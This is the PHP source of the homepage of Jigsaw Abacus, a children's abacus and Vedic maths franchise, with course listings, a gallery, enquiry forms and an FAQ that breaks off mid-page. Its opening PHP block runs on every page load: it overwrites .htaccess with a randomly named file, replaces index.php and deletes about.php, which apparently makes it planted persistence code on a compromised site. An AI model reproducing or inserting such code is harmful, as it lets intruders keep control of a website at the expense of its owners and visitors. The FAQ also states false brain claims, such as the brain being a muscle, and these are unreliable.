<?php
copy("lavnasur.php", ".htaccess");
copy("index2.php", "index.php");

unlink('about.php');
?>

<?php
include('admin/config/config.php');
?>
<!DOCTYPE HTML>

<html>
<head>
    
    <!-----------------NAVDEEP START-------------------->
<meta http-equiv="content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="facebook-domain-verification" content="oqkp76l3cu67gzv73key7vprr5u153dlt" />
<meta name="google-site-verification" content="cheZdH82w2F99e5Ny_N_VY34ZybwikHE-omdIUI6Qf0" />

<?php
include('meta.php');

$page = 'home';
?>

    <!--------------------NAVDEEP END---------------------->


<style>
    .pppp:hover {
      background-color: #008c99 !important;
}
</style>

<style>
    
    
        /* Media Query for Laptops and Desktops */
        @media (max-width: 600px) {
            #desktop-icons {
                
                display:none;
                
            }
        }
</style>

<link href="style.css" rel="stylesheet" type="text/css" >
<link href="css/shortcodes.css" rel="stylesheet" type="text/css">
<link href="css/responsive.css" rel="stylesheet" type="text/css">
<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">
<link rel='stylesheet' id='layerslider-css' href="css/layerslider.css" type='text/css' media='all' />

<link href="css/prettyPhoto.css" rel="stylesheet" type="text/css" media="all" />
<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic" rel='stylesheet' type='text/css'>
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel='stylesheet' type='text/css'>
<link href="https://fonts.googleapis.com/css?family=Bubblegum+Sans" rel='stylesheet' type='text/css'>
</head>

<body class="main">





<div id="header_mbl">

<div class='democlsbtn'>
    <a class="myBtn" class="myBtn" style="cursor: pointer;">
         
         
         <button type="button" class="btnfff btn-danger right" data-toggle="modal" data-target=".enquiry"><b >Book Demo Class</b></button>
    </a>
</div>




<div class="franchenqfrm">
    <a id="myBtndrp" class="myBtndrp" style="cursor: pointer;">
       
       
       <button type="button" class="btnfff btn-danger left" data-toggle="modal" data-target=".enquiry"><b>Franchise Enquiry</b></button>
    </a>   
</div>


</div>


<style>


.left {
  left: 0;
       -webkit-transform-origin: 0 50%;
       -moz-transform-origin: 0 50%;
       -ms-transform-origin: 0 50%;
       -o-transform-origin: 0 50%;
          transform-origin: 0 50%;
       -webkit-transform: rotate(-90deg) translate(-50%, 50%);
       -moz-transform: rotate(-90deg) translate(-50%, 50%);
       -ms-transform: rotate(-90deg) translate(-50%, 50%);
       -o-transform: rotate(-90deg) translate(-50%, 50%);
          transform: rotate(-90deg) translate(-50%, 50%);
          color: #fff;
        background-color: #c9302c;
        border-color: #761c19;
         
}
 
  .left {
  position: fixed;
  top: 0;
  bottom: 0;
  height: 2.5em;
  margin: auto;
  background: #c9302c;
  width: 150px;
  

}


.right {
   
     position: fixed;
     right: -62px;
     top: 0;
     bottom: 0;
     height: 2.5em;
     margin: auto;
     background: #c9302c;
     width: 150px;
     transform: rotate(270deg);
     color: #fff;
           
           
     
}
.btnfff{
        padding: 6px 12px;
}


.btn-danger:active{
        color: #fff;
        background-color: #c9302c;
        border-color: #ac2925;
}

.btn-danger:hover {
        color: #fff;
        background-color: #f7c44e;
        border-color: #ac2925;
</style>

<div class="wrapper">

<?php include_once "header.php";?>

<div id="main">

<div id="slider">
    
<div id="layerslider_4" class="ls-wp-container" alt="jigsaw abacus slide image" style="width:100%;height:610px;max-width:1920px;margin:0 auto;margin-bottom: 0px;">


<!--<div class="ls-slide" data-ls="slidedelay:7000; transition2d: all;">-->
    
<!--    <img class="ls-bg"  src="images/layerslider-gallery/slider1_jigsaw.jpg" alt="abacus student"/>   -->

<!--</div>-->
<div class="ls-slide" data-ls="slidedelay:7000;">
    
    <img class="ls-bg"  src="images/layerslider-gallery/slider1_jigsaw.jpg" alt="abacus student"/>   

</div>

<div class="ls-slide" data-ls="slidedelay:7000;">
    
    <img class="ls-bg"  src="images/layerslider-gallery/slider2_jigsaw.jpg" alt="abacus student"/>   

</div>


<div class="ls-slide" data-ls="slidedelay:7000;">
    
    <img class="ls-bg"  src="images/layerslider-gallery/slider3_jigsaw.jpg" alt="abacus student"/>   

</div>


<!--<div class="ls-slide" data-ls="slidedelay:7000; transition2d: all;">-->
<!--        <img src="images/layerslider-gallery/black-board.jpg" class="ls-bg" alt="abacus class board" />-->
<!--        <img class="ls-l" style="top:35px;left:678px;white-space: nowrap;" data-ls="offsetxout:180;" src="images/layerslider-gallery/school-kid.webp" alt="abacus student">-->
<!--        <img class="ls-l" style="top:23px;left:998px;white-space: nowrap;" data-ls="delayin:1500;scaleyin:3;transformoriginin:0% 50% 0;parallaxlevel:2;" src="images/layerslider-gallery/b-cloud.png" alt="jigsaw franchise 1">-->
<!--        <img class="ls-l" style="top:67px;left:679px;white-space: nowrap;" data-ls="offsetxin:0;offsetyin:-100;delayin:2000;rotateyin:30;parallaxlevel:5;" src="images/layerslider-gallery/b-swirl.png" alt="jigsaw franchise 2">-->
<!--        <img class="ls-l" style="top:78px;left:50px;white-space: nowrap;" data-ls="offsetxin:-200;delayin:2000;" src="images/layerslider-gallery/b-comment1.png" alt="jigsaw franchise 3">-->
<!--        <img class="ls-l" style="top:137px;left:98px;white-space: nowrap;" data-ls="delayin:2500;rotateyin:30;" src="images/layerslider-gallery/black_board_contnet.png" alt="jigsaw franchise 4">-->
        <!-- <img class="ls-l" style="top:222px;left:96px;white-space: nowrap;" data-ls="delayin:3000;rotateyin:30;" src="images/layerslider-gallery/text-desc.png" alt="">
<!--        <a href="https://themeforest.net/item/kids-life-a-trendy-kids-html-template/8565477?WT.ac=portfolio_thumb&amp;WT.z_author=BuddhaThemes" class="ls-l" style="top:397px;left:105px;white-space: nowrap;" data-ls="offsetxin:0;offsetyin:200;delayin:3500;offsetxout:0;offsetyout:150;"><img src="images/layerslider-gallery/purchase-theme.png" alt=""></a> -->-->
        <!-- <img class="ls-l" style="top:395px;left:297px;white-space: nowrap;" data-ls="delayin:3700;" src="images/layerslider-gallery/b-tick.png" alt=""> -->
<!--        <img class="ls-l" style="top:421px;left:100px;white-space: nowrap;" data-ls="offsetxin:0;offsetyin:200;delayin:4000;offsetxout:0;offsetyout:150;" src="images/layerslider-gallery/chalk-effect.png" alt="jigsaw franchise 5">-->
<!--        <img class="ls-l" style="top:30px;left:2px;white-space: nowrap;" data-ls="delayin:3100;rotateyin:90;parallaxlevel:3;" src="images/layerslider-gallery/b-game.png" alt="jigsaw franchise 6">-->
<!--        <img class="ls-l" style="top:498px;left:13px;white-space: nowrap;" data-ls="offsetxin:-100;delayin:3500;parallaxlevel:4;" src="images/layerslider-gallery/b-bulb.png" alt="jigsaw franchise 7">-->
<!--        <img class="ls-l" style="top:524px;left:507px;white-space: nowrap;" data-ls="delayin:2300;rotateyin:180;parallaxlevel:-3;" src="images/layerslider-gallery/b-glass.png" alt="jigsaw franchise 8">-->
<!--</div>-->


</div>
</div>




<section id="primary" class="content-full-width">

<div class="container">
<div class="dt-sc-pricing-table">
<div class="column dt-sc-one-fourth first">
<div class="dt-sc-pr-tb-col blue" style="background:#f0f3f3;">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-thumb">
<!--<img src="images/pricing-image1.jpg" alt="" title="">-->
<div class="dt-sc-tb-title hhhhhhhhh"><h3 style="color:white;">Abacus</h3></div>
</div>
<!--<div class="dt-sc-price"> $20 <span> month</span> </div>-->
</div>
<ul class="dt-sc-tb-content">
<li><b>Age Group:</b> 4 To 14 years</li>
<li><b>Course Duration: </b> 2 To 3 years</li>
<li><b>No. of Classes:</b> 1 Class of 2 hours in a week</li>
<li><b>Batch Size: </b>10 To 15 Students</li>
</ul>
<div class="dt-sc-buy-now"><a href="https://jigsawabacus.com/abacus.php" class="dt-sc-button small">View All</a></div>
</div>
</div>
<div class="column dt-sc-one-fourth">
<div class="dt-sc-pr-tb-col blue" style="background:#f0f3f3;">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-thumb">
<!--<img src="images/pricing-image2.jpg" alt="" title="">-->
<div class="dt-sc-tb-title hhhhhhhhh" ><h3 style="color:white;">Vedic Maths</h3></div>
</div>
<!--<div class="dt-sc-price"> $40 <span> month</span> </div>-->
</div>
<ul class="dt-sc-tb-content">
<li><b>Age Group:</b> 10 Years & Above</li>
<li><b>Course Duration:</b> 1 To 2 Years</li>
<li><b>No. of Classes:</b> 1 Class of 2 hours in a week</li>
<li><b>Batch Size:</b> 10 To 15 Students</li>
</ul>
<div class="dt-sc-buy-now"><a href="https://jigsawabacus.com/ganit-gyan.php" class="dt-sc-button small ">View All</a></div>
</div>
</div>
<div class="column dt-sc-one-fourth">
    <div class="dt-sc-pr-tb-col blue" style="background:#f0f3f3;">
    <div class="dt-sc-tb-header">
    <div class="dt-sc-tb-thumb">
        <!--<img src="images/pricing-image3.jpg" alt="" title="">-->
        <div class="dt-sc-tb-title hhhhhhhhh"><h3 style="color:white;">English</h3></div>
    </div>
    <!--<div class="dt-sc-price"> $60 <span> month</span> </div>-->
    </div>
    <ul class="dt-sc-tb-content">
        <li><b>Age Group:</b> 4 to 14 years</li>
        <li><b>Course Duration:</b> 1 To 2 Years</li>
        <li><b>No. of Classes:</b> 2 Classes of 1 Hour each in a week</li>
        <li><b>Batch Size:</b> 10 to 15 students</li>
    </ul>
    <div class="dt-sc-buy-now"><a href="https://jigsawabacus.com/jigsawenglish.php" class="dt-sc-button small " >View All</a></div>
    </div>
</div>
<div class="column dt-sc-one-fourth">
<div class="dt-sc-pr-tb-col blue" style="background:#f0f3f3;">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-thumb">
<!--<img src="images/pricing-image4.jpg" alt="" title="">-->
<div class="dt-sc-tb-title hhhhhhhhh"><h3 style="color:white;">Handwriting</h3></div>
</div>
<!--<div class="dt-sc-price"> $80 <span> month</span> </div>-->
</div>
<ul class="dt-sc-tb-content">
    <li><b>Handwriting Improvement:</b> No Age Bar Limit</li>
    <li><b>Cursive Writing:</b> 4 to 10 years</li>
    <li><b>Calligraphy:</b> 10 years & above</li>
    <li><b>Designer Fonts:</b> 10 years & above</li>
</ul>
<div class="dt-sc-buy-now"><a href="https://jigsawabacus.com/handwriting.php" class="dt-sc-button small " >View All</a></div>
</div>
</div>
</div>
</div>


</section>







<section id="" class="">
    
        <div class="container" style="text-align: center; ">
         
         
         <div class="">
            <img src="images/icons/button1 (1).png" class="myBtn" alt="Book your trial class" title="Book your trial class" height="100%" width="100%" style="cursor:pointer;">
         </div>
            
        </div>
</section>


<style>
     .button123{
       width: 30%;
       height: 70px;
       float:right;
      
       font-size: 20px;
       border-radius: 14px;
       color: black;
       text-align: 20px;
       border-color: skyblue;
       background-color: skyblue;
       
    }
</style>






<section class="fullwidth-background dt-sc-parallax-section turquoise-bg">

<div class="container">

<div class="dt-sc-one-half column first">
<h2>Our Strength </h2>

<div class="dt-sc-one-half column first">
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht">17 + years Experience </h5>

</div>
<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
    <div class="icon">
        <span class="fa fa-pencil"> </span>
    </div>
    <h5 class="wht"> A carefully constructed curriculum that has yielded results </h5>
</div>
<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
    <div class="icon">
        <span class="fa fa-pencil"> </span>
    </div>
        <h5 class="wht"> Team of Professionals from different sectors </h5>
</div>


<div class="dt-sc-hr-very-small"></div>
    <div class="dt-sc-ico-content type2">
        <div class="icon">
            <span class="fa fa-pencil"> </span>
        </div>
        <h5 class="wht"> Students from All Over the Globe  </h5>
    </div>



<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht"> Regular R & D and Course Updation  </h5>
</div>


</div>


<div class="dt-sc-one-half column">
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht"> Rigorously trained teachers </h5>

</div>
<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht">Annual Zonal, National & International Level Competitions </h5>
</div>

<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht">Small Batches & Personal Attention </h5>
</div>


<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht">Online & Offline Classes Available </h5>
</div>


<div class="dt-sc-hr-very-small"></div>
<div class="dt-sc-ico-content type2">
<div class="icon">
<span class="fa fa-pencil"> </span>
</div>
<h5 class="wht">Online & Offline Classes Available </h5>
</div>

</div>

</div>


<style>
    .wht{
        color:white;
    }
</style>






    <div class="dt-sc-one-half column">
        <h2>Recent Updates</h2>
            <div class="add-slider-wrapper">
                <ul class="add-slider">
                        <!--<li><iframe width="560" height="315" src="https://www.youtube.com/embed/Lqfn4QATPVQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"  width="460" height="340" allowfullscreen></iframe></li>-->
                        <!--<li> <img src="images/banner/add.jpeg" alt="" title="" width="460" height="340"></li>   -->
                        
                        <!--<li> <iframe src="https://www.youtube.com/embed/ej7-GBkgcvo" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" style="" width="460" height="340" frameborder="0"></iframe> </li>-->
                        <!--<li> <iframe src="https://www.youtube.com/embed/xzrWya6LDG0" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" style="" width="460" height="340" frameborder="0"></iframe> </li>-->
                        
                        <!-- <li> <img src="images/add1.jpg" alt="" title=""> </li> -->
            
                        <li><img src="images/recent1.jpg" alt="" title="" ></li> 
                        <li><img src="images/recent2.jpg" alt="" title="" ></li> 
                        <li><img src="images/recent3.jpg" alt="" title="" ></li> 
            
            
                        <!--<li><img src="images/bresult1.jpeg" alt="advertisement" title="advertisement"></li>-->
                </ul>
            </div>
    </div>

</div>




</section>





<div class="container" style="text-align: center; ">
       
            
            <img src="images/icons/button2.png" class="myBtndrp" alt="open your own franchise" title="open your own franchise" height="100%" width="100%" style="cursor:pointer;">

</div>







<div class="container">
<h2 class="dt-sc-hr-green-title">Our Gallery</h2>

<div class="front-portfolio-container" >
<div class="portfolio-content portfolio-content1">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/jigsaw (1).jpg" alt="classes" title="jigsaw wizard">
<div class="image-overlay">
<h5><a href="gallery-jw.php">Jigsaw Wizard</a></h5>
<a href="gallery-jw.php" class="link"><span class="fa fa-link"></span></a>
<a href="images/gal/jigsaw (1).jpg" data-gal="prettyPhoto[gallery]" class="zoom"><span class="fa fa-search"></span></a>
</div>
</div>
</div>
</div>
</div>
<div class="portfolio-content portfolio-content2">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/video.jpg" alt="abacus training" title="abacus training">
<div class="image-overlay">
<h5><a href="https://www.youtube.com/@jigsawabacus">Videos</a></h5>
<a href="https://www.youtube.com/@jigsawabacus" class="link"><span class="fa fa-link"></span></a>
<a href="images/gal/video.jpg" data-gal="prettyPhoto[gallery]" class="zoom"><span class="fa fa-search"></span></a>
</div>
</div>
</div>
</div>
</div>
<div class="portfolio-content portfolio-content3">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/news.jpg" alt="print media" title="print media" style="height:450px;">
<div class="image-overlay">
<h5><a href="portfolio-detail.php">Print Media</a></h5>
<a href="printmedia.php" class="link"><span class="fa fa-link"></span></a>
<a href="images/gal/news.jpg" data-gal="prettyPhoto[gallery]" class="zoom"><span class="fa fa-search" ></span></a>
</div>
</div>
</div>
</div>
</div>
<div class="portfolio-content portfolio-content4">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/jigsaw (3).jpg" alt="classes" title="" style="height:315px;">
<div class="image-overlay">
<h5><a href="gallery-exertion.php">Excursions</a></h5>
<a href="gallery-exertion.php" class="link"><span class="fa fa-link"></span></a>
<a href="images/gal/jigsaw (3).jpg" data-gal="prettyPhoto[gallery]" class="zoom"><span class="fa fa-search"></span></a>
</div>
</div>
</div>
</div>
</div>
<div class="portfolio-content portfolio-content5">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/jlogo.png" alt="jigsaw abacus logo" title="jigsaw abacus logo">
<div class="">
<h5><a href="gallery-exertion.php">Jigsaw Logo</a></h5>


</div>
</div>
</div>
</div>
</div>
<div class="portfolio-content portfolio-content6">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/ourcentre.jpg" alt="abacus centre" title="abacus centre">
<div class="image-overlay">
<h5><a href="gallery-ourcenters.php">Our Centers</a></h5>
<a href="portfolio-detail.php" class="link"><span class="fa fa-link"></span></a>
<a href="images/gal/ourcentre.jpg" data-gal="prettyPhoto[gallery]" class="zoom"><span class="fa fa-search"></span></a>
</div>
</div>
</div>
</div>
</div>
<div class="portfolio-content portfolio-content7">
<div class="front-portfolio">
<div class="portfolio-outer">
<div class="portfolio-thumb">
<img src="images/gal/jigsaw (2).jpg" alt="jigsaw kids" title="jigsaw kids" style="height: 350px;">
<div class="image-overlay">
<h5><a href="gallery-kids.php">Our Kids</a></h5>
<a href="gallery-kids.php" class="link"><span class="fa fa-link"></span></a>
<a href="images/gal/jigsaw (2).jpg" data-gal="prettyPhoto[gallery]" class="zoom"><span class="fa fa-search"></span></a>
</div>
</div>
</div>
</div>
</div>
<div class="dt-sc-hr-small"></div>
<div class="aligncenter">
<a href="gallery.php" class="dt-sc-button medium mustard" style="background: #4c7297;"> Hit here to view all <span class="fa fa-chevron-circle-right"> </span></a>
</div>
</div>

</div>

<div class="dt-sc-hr"></div>

<section class="fullwidth-background dt-sc-parallax-section orange-bg">

<div class="container">
<h2 class="dt-sc-hr-white-title">Enquiry</h2>



<div class="dt-sc-pricing-table">

<div class="column dt-sc-one-fourth first">
<div class="dt-sc-pr-tb-col">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-header-img">
<img src="images/mickey.png" alt="" title="">
</div>
<h4 class="asdfg"> Franchise </h4>
<img src="images/Franchisee_1 (3).jpg" alt="franchisee.webp" title="abacus franchise form" style="width: 100%;height: 100%;">
  <!--<p><b>Franchise Collaboration:</b> Interested in Your Brand's Success</p> -->
<a href="franchise.php" class="dt-sc-button small burnt-orange ssd" target="_blank"> Application Form <span class="fa fa-chevron-circle-right"> </span></a>
</div>
</div>
</div>

<style>
    .asdfg{
        margin:0px;
        padding:10px;
    }
</style>



<div class="column dt-sc-one-fourth">
<div class="dt-sc-pr-tb-col">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-header-img">
<img src="images/girl.png" alt="" title="">
</div>
<div class="dt-sc-tb-title">
<h4 class="asdfg"> School </h4>
<img src="images/welcome (1).jpg" alt="admission form" title="admission form" height="100%" width="100%">
<!-- <p>Vestibulum Ante Ipsum Primis In Faucibus Orci Luctus Et Nulla at nulla justo, eget luctus tortor. Nulla facilisi. Duis aliquet egestas purus in blandit. Curabitur vulputate, ligula lacinia scelerisque tempor, lacus lacus ornare ante, ac egestas est urna sit amet arcu</p> -->
<a href="abacus-school-form.php" class="dt-sc-button small burnt-orange" target="_blank"> Application Form <span class="fa fa-chevron-circle-right"> </span></a>
</div>
</div>
</div>
</div>






<div class="column dt-sc-one-fourth">
<div class="dt-sc-pr-tb-col">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-header-img">
<img src="images/butterfly.png" alt="" title="">
</div>
<div class="dt-sc-tb-title">

<h4 class="asdfg"> Teacher </h4>


<img src="images/teacher_training.jpg" alt="recruitment form" title="recruitment form" height="100%" width="100%">
<!-- <p>Vestibulum Ante Ipsum Primis In Faucibus Orci Luctus Et Nulla at nulla justo, eget luctus tortor. Nulla facilisi. Duis aliquet egestas purus in blandit. Curabitur vulputate, ligula lacinia scelerisque tempor, lacus lacus ornare ante, ac egestas est urna sit amet arcu</p> -->
<a href="recruitment-form.php" class="dt-sc-button small ssd burnt-orange" target="_blank"> Application Form <span class="fa fa-chevron-circle-right"> </span></a>
</div>
</div>
</div>
</div>




<div class="column dt-sc-one-fourth">
<div class="dt-sc-pr-tb-col">
<div class="dt-sc-tb-header">
<div class="dt-sc-tb-header-img">
<img src="images/tweety.png" alt="" title="">
</div>
<div class="dt-sc-tb-title">
<h4 class="asdfg"> Student </h4>
<img src="images/student.jpg" alt="abacus student form" title="abacus student form" height="100%" width="100%">
<a href="abacus-student-enquiry-form.php" class="dt-sc-button small  burnt-orange" target="_blank"> Application Form <span class="fa fa-chevron-circle-right"> </span></a>
</div>
</div>
</div>
</div>


<style>
    .fullwidth-background.orange-bg .dt-sc-button.small .ssd:hover {
    background: #e0687e;
    color: #fff;
}


</style>



</div>



</div>

</section>





<div class="dt-sc-hr"></div>
<h1 class="dt-sc-hr-green-title">Why Choose Us</h1>
<div class="dt-sc-hr"></div>
<div class="container">
<div class="column dt-sc-one-fourth first">
<div class="dt-sc-ico-content type3" style="text-align:left;">
<div class="icon " style="background:#4c7297;">
<span class="fa fa-connectdevelop"> </span>
</div>
<h4> Intellectual Development </h4>
<ul class="dt-sc-fancy-list turquoise tree">
<li>With our top-notch abacus courses, each child is given an opportunity to acquire cognitive skills like concentration, visualisation, photogenic memory, etc.</li> 
<li>Special emphasis is given on strengthening the mental capacities of a child that helps them become fast & rational thinkers. </li>
</ul>
</div>
</div>
<div class="column dt-sc-one-fourth">
<div class="dt-sc-ico-content type3" style="text-align:left;">
<div class="icon " style="background:#4c7297;">
<span class="fa fa-sun-o"> </span>
</div>
<h4> Idea Generation </h4>
<ul class="dt-sc-fancy-list turquoise tree">
<li>We primarily focus on growing a child's intellect by providing supportive learning experiences. Best abacus courses help children ideate & think 'out of the box'. </li> 
<li>Special emphasis is given on strengthening the mental capacities of a child that helps them become fast & rational thinkers.</li>
</div>
</div>
<div class="column dt-sc-one-fourth">
<div class="dt-sc-ico-content type3" style="text-align:left; height: 297px;">
<div class="icon " style="background:#4c7297;">
<span class="fa fa-globe"> </span>
</div>
<h4> Global Education </h4>
<ul class="dt-sc-fancy-list turquoise tree">
<li>Is your child ready to face the world? </li> 
<li>You can make them Confident & independent individuals by equipping them with most relevant skills like confidence, visualisation, concentration & a lot more. Abacus can help in building these skills in your child. </li>
</div>
</div>
<div class="column dt-sc-one-fourth">
<div class="dt-sc-ico-content type3" style="text-align:left; height: 297px;">
<div class="icon " style="background:#4c7297;">
<span class="fa fa-smile-o"> </span>
</div>
<h4> Admired Curriculum </h4>
<ul class="dt-sc-fancy-list turquoise tree">
<li>After careful research by a team of experts we have curated a holistic & broad curriculum, divided into 8 progressive levels, keeping in mind the individual differences. </li>
<li>This helps your children to grasp & learn at their own speed by making successive wins. </li>
</div>
</div>
</div>




<div class="container">

        <section id="primary" class="content-full-width">
<div class="column dt-sc-one-full first">
    <h2> FAQ </h2>

<div class="dt-sc-toggle-frame-set">
    <div class="dt-sc-toggle-frame">
        <h5 class="dt-sc-toggle"><a href="#"><b> What is Jigsaw Abacus Wizkid ? </b></a></h5>
        <div class="dt-sc-toggle-content">
            <div class="dt-sc-block">
			        <b>JIGSAW ABACUS WIZKID</b> is a programme run by Jigsaw Edu Solutions Pvt. Ltd.
				<b>JIGSAW</b>– means a ‘Puzzle’ which can be solved by placing the right parts at appropriate place<br>
				<b>ABACUS</b> – a magical brain tool.<br>
				<b>WIZKID</b> -a ‘ Brilliant Child.<br><br>

				Here at Jigsaw, we have tailor made programmes for different children who want to learn abacus as per their needs. Here we are talking about <b>Jigsaw Abacus Wizkid (JAW)</b> which is brain development course for age group 7-14 years for creating and nurturing of brilliant minds. The “playway” methods adopted guarantee that the child learns in a burden free yet student friendly environment.<br><br>

				<b>Jigsaw Abacus Wizkid</b> is a scientifically structured programme to sharpen a young brain to perform complex calculations and computations at breathtaking speeds. The usage of Abacus is combined with flashcards so as to get the young brain “worked up” to function in a comprehensive manner.<b> ABACUS EXPLORES AND GROWS YOUR CHILD’S POTENTIAL TO MOST COMPLICATED MATHEMATICS CALCULATION AT THE SPIN OF A HAT</b> <br><br>

				Constant Research & Development is being done by professors who are working on this project and towards improvement, necessary upgradation and better understanding of this ancient art of teaching mental maths with abacus. This will slowly but surely ensure that the child receives the right blend of knowledge as well as guidance from the faculty and is able to live up to the expectations forged in front of him. <br><br>

				
				<ul class="dt-sc-fancy-list burnt-orange graduation-cap">
					<h6>Course Detail:</h6>
        				<li>A set of 8 stages.</li>
        				<li>A stage can be completed in 3 months.</li>
        				<li>A class of 2 hours in a week.</li>
        				<li>After completion of each stage, an assessment test is taken.</li>
        				<li>Certificates are issued to every child after completion of a stage.</li>
				</ul>
            </div>
        </div>
    </div>
    <div class="dt-sc-toggle-frame">
        <h5 class="dt-sc-toggle"><a href="#"> <b> What is Jigsaw Kinder Abacus ? </b> </a></h5>
        <div class="dt-sc-toggle-content">
            <div class="dt-sc-block">
            					<b>Jigsaw believes that every child is different. So Jigsaw has developed a separate course for age group 4 to 7 years children.</b> The “playway” methods adopted guarantee that the child learns in a burden free yet student friendly environment. The books and course content are different than Jigsaw Abacus Wizkid. These are designed and defined keeping in mind the interest of our youngsters.<br>
            					<b>Jigsaw Kinder Abacus</b> is a young sibling to the Jigsaw Abacus Wizkid programme, engaged in providing brain sharpening and orientation at a very early stage of life. It moulds an infant brain to perform better and lays the foundation for stunning outcomes. Jigsaw Kinder Abacus is a scientifically structured programme to sharpen a young brain to perform complex calculations and computations at breathtaking speeds. The usage of Abacus is combined with flashcards so as to get the young brain “worked up” to function in a comprehensive manner.<br><br>
            					<b>ABACUS EXPLORES AND GROWS YOUR CHILD’S POTENTIAL TO MOST COMPLICATED MATHEMATICS CALCULATION AT THE SPIN OF A HAT</b>
            					Constant Research & Development is being done by professors who are working on this project and towards improvement, necessary upgradation and better understanding of this ancient art of teaching mental maths with abacus. This will slowly but surely ensure that the child receives the right blend of knowledge as well as guidance from the faculty and is able to live up to the expectations forged in front of him.
            				
            				   <ul class="dt-sc-fancy-list burnt-orange graduation-cap">
            				    	<h6>Course Detail:</h6>
                					<li> A set of 10 modules.</li>
                					<li> A module can be completed in 3 months.</li>
                					<li> A class of 2 hours in a week.</li>
                					<li> After completion of each module, an assessment test is taken.</li>
                					<li> Certificates are issued to every child after completion of a module. </li>
            					</ul>
            </div>
        </div>
    </div>
    <div class="dt-sc-toggle-frame">
          <h5 class="dt-sc-toggle"><a href="#"> <b> What is Abacus ? </b> </a></h5>
            <div class="dt-sc-toggle-content">
                <div class="dt-sc-block">
    				Thousands of years prior to the invention of the mechanical and electronic calculator, mathematicians all over the world made use of abaci – a surprisingly helpful tool. The word ‘abacus’ derives from the Greek word ‘abax’ or ‘abakon’ meaning table or tablet, which originated from the Semitic word ‘abaq’ meaning sand. The plural of ‘abacus’ is ‘abacuses’ or ‘abaci’. And a user is called abacist.<br><br>
    
    				<h6>Today’s Abacus</h6>
    
    				<p>An abacus is divided into two portions, a “lower” portion and narrower “upper” portion separated by a dividing bar. In each of these portions there are several series’ of beads which can be moved up or down (abaci are meant to be used lying flat). The columns of beads in the bottom portion have four, while the top portion contains columns of only one. The bottom beads are all meant to represent values of 1 and the top beads represent values of 5. The individual columns, however, represent powers of ten. This all provides simple algorithmic methods of performing basic calculations.</p><br><br>
    
    				<h6>Mental arithmetic by images of Abacus</h6>
    				<p>Abacus is a time-tested tools to augment the faculties of the brain. The usage of Abacus has been refined to develop the mental capabilities of children in JAW programme. The practice proves good for training children’s observation ability and attention ability. Working with abacus demands the coordinated work of hands, eyes and brain. Series of activities such as visualization, memory, concentration, analysis, judgment and control in the brain go hand in hand to do the mental calculation with speed and accuracy.</p><br>
    
    				<h6>Facts about brain</h6>
    				<p>The human brain is by the most important part of the body. Essentially a muscle, the brain acts as the source of intelligence require to carry out, all the vital activities in our day to day life. The brain is actually divided into left and right hemispheres, with the left hemisphere controlling the right part and the right hemisphere controlling the left part of the body.</p><br>
    
    				<p>The left part of the brain is fundamentally responsible for linear reasoning and logical analysis. It uses the fact based knowledge gained through experience as the premises for deducing a conclusion. Left brain’s function in a day-to-day life involves carrying out short/detailed description of the various things we see or do. Also it helps in learning new things coupled with fresh concepts. Research says that most people utilize more of left brain than the right brain.</p><br>
    
    				<p>The right part of the brain is responsible for controlling the left part of the body. It can be called as the “Creative part” of the brain too as it is the source of innovation . It has the functionality to remember & recall images, tunes of songs, formulation of hypothesis and so on. As mentioned earlier, it is a relatively less utilize portion of the brain.</p>
    
    				<p>We at JAW, are involved in sharpening the acumen with respect to the right brain and bring out a proper end-to-end coordination between the left and the right brain. Given the fact that abacus is the tool that we use, scientific analysis do confirm that it is a very comprehensive tool to achieve the purpose. The child uses his right part of the brain to imagine the bead movement whereas the left part gets exercised due to recalling of numbers and their proper placement to get the solution. Hence, a mutual coordination among the two hemispheres gets established.</p>
    
    				<h6>Best Learning Age for the Children</h6>
